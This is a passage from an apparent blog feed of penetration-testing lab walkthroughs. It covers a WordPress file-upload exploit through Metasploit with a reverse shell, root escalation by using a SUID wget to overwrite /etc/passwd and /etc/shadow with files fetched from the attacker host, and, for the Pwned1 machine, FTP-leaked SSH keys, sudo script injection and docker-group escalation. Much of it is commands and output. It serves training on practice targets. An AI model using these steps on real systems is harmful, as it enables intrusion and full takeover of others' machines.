http://192.168.120.51/server-status (CODE:403|SIZE:279)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.51/wordpress/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a><strong>WPScan</strong></h3><p>Having discovered the <em>/wordpress</em> directory, we can further scan it with <code>wpscan</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wpscan --url http://192.168.120.51/wordpress --enumerate p</span><br><span class="line">...</span><br><span class="line">[+] reflex-gallery</span><br><span class="line"> | Location: http://192.168.120.51/wordpress/wp-content/plugins/reflex-gallery/</span><br><span class="line"> | Last Updated: 2019-05-10T16:05:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.1.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 3.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.120.51/wordpress/wp-content/plugins/reflex-gallery/readme.txt</span><br><span class="line"> ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This scan identified the Wordpress plugin <code>reflex-gallery</code>. The plugin is out of date, and the installed version is vulnerable to arbitrary file upload.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="File-Upload-Vulnerability"><a href="#File-Upload-Vulnerability" class="headerlink" title="File Upload Vulnerability"></a><strong>File Upload Vulnerability</strong></h3><p>We can use Metasploit framework’s module <code>wp_reflexgallery_file_upload</code> to automatically exploit this vulnerability and gain remote code execution on the target. We can do this as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfconsole</span><br><span class="line">...</span><br><span class="line">msf5 &gt; use exploit/unix/webapp/wp_reflexgallery_file_upload</span><br><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; set rhosts 192.168.120.51</span><br><span class="line">rhosts =&gt; 192.168.120.51</span><br><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; set targeturi /wordpress</span><br><span class="line">targeturi =&gt; /wordpress</span><br><span class="line">msf5 exploit(unix/webapp/wp_reflexgallery_file_upload) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:4444</span><br><span class="line">[+] Our payload is at: vygnooMsrtTC.php. Calling payload...</span><br><span class="line">[*] Calling payload...</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.120.51</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.118.3:4444 -&gt; 192.168.120.51:38504) at 2020-03-02 10:12:05 -0500</span><br><span class="line">[+] Deleted vygnooMsrtTC.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2072 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a><strong>SUID</strong></h3><p>Looking for binaries with SUID permission leads us to <strong>wget</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">...</span><br><span class="line">/usr/bin/wget</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Because we can run <strong>wget</strong> with elevated privileges, we can use it to overwrite the <strong>/etc/passwd</strong> file and create a new user for ourselves that has root access. First, let’s see the original file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false</span><br><span class="line">whoopsie:x:112:117::/nonexistent:/bin/false</span><br><span class="line">kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:114:119::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">raj:x:1000:1000:raj,,,:/home/raj:/bin/bash</span><br><span class="line">mysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">sshd:x:124:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">www-data@ubuntu:/home/raj$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We will copy the original file to our attacking machine and save it as <strong>passwd</strong>. Next, we need to generate a new user to append to the file. This can be done with the help of <strong>openssl</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ openssl passwd -1 -salt hacker pass123</span><br><span class="line">$1$hacker$zVnrpoW2JQO5YUrLmAs.o1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can now append <code>hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash</code> to our copy of <strong>passwd</strong> and save the file. We will host our file using a python web server:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ python -m SimpleHTTPServer 8000</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>In our shell on the target, we will now navigate to the <em>/etc</em> directory and then download our copy of <strong>passwd</strong>, thus overwriting the original and introducing our new user:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/uploads/2020/03$ cd /etc</span><br><span class="line">cd /etc</span><br><span class="line">www-data@ubuntu:/etc$ wget -O passwd http://192.168.118.3:8000/passwd</span><br><span class="line">wget -O passwd http://192.168.118.3:8000/passwd</span><br><span class="line">--2020-03-02 07:28:44--  http://192.168.118.3:8000/passwd</span><br><span class="line">Connecting to 192.168.118.3:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2565 (2.5K) [application/octet-stream]</span><br><span class="line">Saving to: &#x27;passwd&#x27;</span><br><span class="line"></span><br><span class="line">passwd              100%[===================&gt;]   2.50K  --.-KB/s    in 0s</span><br><span class="line"></span><br><span class="line">2020-03-02 07:28:44 (159 MB/s) - &#x27;passwd&#x27; saved [2565/2565]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we now look at the end of the file, we should see that our user has been successfully appended:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/etc$ tail passwdtail passwdavahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologincolord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologinhplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/falsegeoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologingnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/falsegdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/falseraj:x:1000:1000:raj,,,:/home/raj:/bin/bashmysql:x:122:128:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:124:65534::/run/sshd:/usr/sbin/nologinhacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p>All that is left to do is log in as the user <code>hacker</code> with the password <code>pass123</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/etc$ su hacker</span><br><span class="line">su hacker</span><br><span class="line">Password: pass123</span><br><span class="line"></span><br><span class="line">root@ubuntu:/etc# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We have obtained a root shell.</p>
<p>Focus：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>将目标中的/etc/shadow文件复制出来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/shadow /var/www/html/wordpress/shadow</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget [http://192.168.43.42/wordpress/shadow](http://192.168.43.42/wordpress/shadow)</span><br></pre></td></tr></table></figure>

<p>在KALI中修改shadow文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root:X014elvznJq7E:18150:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>使用新的哈希值修改了前两个冒号之间的字符串</p>
<p>实际上使用了本地/etc/shadow文件中的哈希值（它具有默认密码“ toor ”的哈希值）</p>
<p>将修改后的shadow复制回目标机器中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget [http://192.168.43.31/shadow](http://192.168.43.31/shadow) -O /etc/shadow</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pass：toor</span><br></pre></td></tr></table></figure>

<p>未经验证的SQL注入漏洞（Unauthenticated SQL Injection vulnerability）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/http/wp_symposium_sql_injection</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.43.42</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> TARGETURI /wordpress</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>任意文件上传漏洞（Arbitrary File Upload vulnerability）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_reflexgallery_file_upload</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.43.42</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> TARGETURI /wordpress</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Wordpress</tag>
        <tag>Msfconsole</tag>
        <tag>Shadow</tag>
        <tag>SQL</tag>
        <tag>Upload Exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwned1</title>
    <url>/undefined/Pwned1/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Pwned1"><a href="#Exploitation-Guide-for-Pwned1" class="headerlink" title="Exploitation Guide for Pwned1"></a><strong>Exploitation Guide for Pwned1</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nmap 192.168.120.220</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-08 16:54 EDT</span><br><span class="line">Nmap scan report for 192.168.120.220</span><br><span class="line">Host is up (0.038s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-application"><a href="#Web-application" class="headerlink" title="Web application"></a><strong>Web application</strong></h3><p>We start off by exploring the web app.There is nothing really worthy on the main page but the <code>/robots.txt</code> page reveals interesting pages to explore.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/robots.txt</span><br><span class="line"># Group 1</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Allow: /nothing</span><br><span class="line">Allow: /hidden_text</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Exploring that <code>/hidden_text</code> page, we find a directory listing which leads to <code>/secret.dic</code> page.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/hidden_text/secret.dic</span><br><span class="line">/hacked</span><br><span class="line">/vanakam_nanba</span><br><span class="line">/hackerman.gif</span><br><span class="line">/facebook</span><br><span class="line">/whatsapp</span><br><span class="line">/instagram</span><br><span class="line">/pwned</span><br><span class="line">/pwned.com</span><br><span class="line">/pubg</span><br><span class="line">/cod</span><br><span class="line">/fortnite</span><br><span class="line">/youtube</span><br><span class="line">/kali.org</span><br><span class="line">/hacked.vuln</span><br><span class="line">/users.vuln</span><br><span class="line">/passwd.vuln</span><br><span class="line">/pwned.vuln</span><br><span class="line">/backup.vuln</span><br><span class="line">/.ssh</span><br><span class="line">/root</span><br><span class="line">/home</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We try a few of those but most don’t seem to work. Let’s automate the tries instead of checking them all one by one.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/hidden_text/secret.dic &gt; /tmp/secret.dic</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">kali@kali:~$ gobuster dir -u http://192.168.120.220 -w /tmp/secret.dic</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.120.220</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /tmp/secret.dic</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/08 17:11:35 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">//pwned.vuln (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/08 17:11:36 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We find that only <code>/pwned.vuln</code> is valid. If we go to that page, we can find some credentials in the comments.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.220/pwned.vuln/</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br><span class="line">&lt;?php</span><br><span class="line">...</span><br><span class="line">//	if ($un==&#x27;ftpuser&#x27; &amp;&amp; $pw==&#x27;B0ss_Pr!ncesS&#x27;) &#123;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Exploring-the-FTP-server"><a href="#Exploring-the-FTP-server" class="headerlink" title="Exploring the FTP server"></a><strong>Exploring the FTP server</strong></h3><p>By using the credentials found earlier, we can log in to the FTP server. In it, we find two interesting files.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ftp 192.168.120.220</span><br><span class="line">Connected to 192.168.120.220.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.120.220:vagrant): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jul 10 12:47 share</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd share</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0            2602 Jul 09 15:05 id_rsa</span><br><span class="line">-rw-r--r--    1 0        0              75 Jul 09 17:41 note.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The first one is a private SSH key, and the other one is a note that conveniently contains the associated username.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat note.txt</span><br><span class="line"></span><br><span class="line">Wow you are here</span><br><span class="line"></span><br><span class="line">ariana won&#x27;t happy about this note</span><br><span class="line"></span><br><span class="line">sorry ariana :(</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>Using the <strong>id_rsa</strong> key we found, we can SSH to the machine.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ chmod 400 id_rsa</span><br><span class="line">kali@kali:~$ ssh -i id_rsa ariana@192.168.120.220</span><br><span class="line">...</span><br><span class="line">ariana@pwned:~$ id</span><br><span class="line">uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Let’s look at the commands our user is allowed to run with <code>sudo</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ariana@pwned:~$ sudo -l</span><br><span class="line">Matching Defaults entries for ariana on pwned:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ariana may run the following commands on pwned:</span><br><span class="line">    (selena) NOPASSWD: /home/messenger.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s see this script with <code>cat /home/messenger.sh</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">echo &quot;Welcome to linux.messenger &quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;$users&quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter username to send message : &quot; name</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter message for $name :&quot; msg</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;Sending message to $name &quot;</span><br><span class="line"></span><br><span class="line">$msg 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">		echo &quot;&quot;</span><br><span class="line">echo &quot;Message sent to $name :) &quot;</span><br><span class="line">		echo &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Exploiting-the-script"><a href="#Exploiting-the-script" class="headerlink" title="Exploiting the script"></a><strong>Exploiting the script</strong></h3><p>Looks like this script is running what we pass to the “Enter message for $name” prompt and then sends it to <code>/dev/null</code>.We can use this to run a shell. Since we run it as sudo, this will give us a shell as the selena user.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ariana@pwned:~$ sudo -u selena /home/messenger.sh</span><br><span class="line"></span><br><span class="line">Welcome to linux.messenger</span><br><span class="line"></span><br><span class="line">ariana:</span><br><span class="line">selena:</span><br><span class="line">ftpuser:</span><br><span class="line"></span><br><span class="line">Enter username to send message : whatever</span><br><span class="line"></span><br><span class="line">Enter message for whatever :/bin/bash</span><br><span class="line"></span><br><span class="line">Sending message to whatever</span><br><span class="line">id</span><br><span class="line">uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">selena@pwned:/home/ariana$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Escalating-to-root"><a href="#Escalating-to-root" class="headerlink" title="Escalating to root"></a><strong>Escalating to root</strong></h3><p>In the <code>id</code> command above, we can see that we are in the <strong>docker</strong> group.This allows us to do very nasty things: <a href="https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface">https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface</a></p>
<p>Let’s see what images are available.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selena@pwned:/home/ariana$ docker image ls</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">privesc             latest              09ae39f0f8fc        2 months ago        88.3MB</span><br><span class="line">&lt;none&gt;              &lt;none&gt;              e13ad046d435        2 months ago        88.3MB</span><br><span class="line">alpine              latest              a24bb4013296        3 months ago        5.57MB</span><br><span class="line">debian              wheezy              10fcec6d95c4        18 months ago       88.3MB</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>alpine</strong> images are usually pretty bare bones but any of the other 2 images will do just fine for our needs (<strong>privesc</strong> is a fairly obvious hint, but we don’t need to use that one).As shown by the link above, we can mount the host’s <code>/</code> folder inside of a container.Since SSH is open on the machine, we’ll use this to edit the root’s <strong>authorized_keys</strong> file.</p>
<p>We can simply paste our host’s public key here.If you don’t have an SSH key pair created, you can use the <code>ssh-keygen</code> command.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selena@pwned:/home/ariana$ docker run -it -v /:/host debian:wheezy sh</span><br><span class="line"># cd /host/root</span><br><span class="line"># ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root root 4096 Jul 10 07:32 .</span><br><span class="line">drwxr-xr-x 18 root root 4096 Aug 11 08:14 ..</span><br><span class="line">-rw-------  1 root root  264 Sep  8 19:53 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  601 Jul  6 12:40 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jul  4 14:02 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root  429 Jul 10 06:41 root.txt</span><br><span class="line"># mkdir .ssh</span><br><span class="line"># echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcKw2si1MnX9Zc2qlnoPvILKv9EI/2hISK4Gy0a6cIMRjys3oxkv5CEBdSMCA33K8IDniHC6vhf1D9xM9fjjEgocu45CJnRtGyX4ewfduqdwkQlOirqStYP9mjkjmqSj65dU3fAk3LZjZNxUjPPY7GvELeJyLzIUlOgnWKKo/sYOcyHcG9PZpQDngcEJ5jbEs/8meNp+ejaGUegyn8TZfG/4Gy18uUkIEV1Muc2Xc9e+KQOWZ3SehxJQwqGZycTGJBy49hA8/1iHOsyQyr/lgnkVewEyB2i9tN7WqrZeMY+DqvDP/qxIHGf4U17NKqM/npAAviH6noeDBZZEQq56Ad kali@kali&#x27; &gt; .ssh/authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then we can SSH to the machine as root.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh root@192.168.120.220</span><br><span class="line">...</span><br><span class="line">root@pwned:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>Focus:</p>
<p>docker提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it privesc chroot /mnt sh</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Script</tag>
        <tag>Ftp</tag>
      </tags>
  </entry>
  <entry>
    <title>Solstice</title>
    <url>/undefined/Solstice/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Solstice"><a href="#Exploitation-Guide-for-Solstice" class="headerlink" title="Exploitation Guide for Solstice"></a><strong>Exploitation Guide for Solstice</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
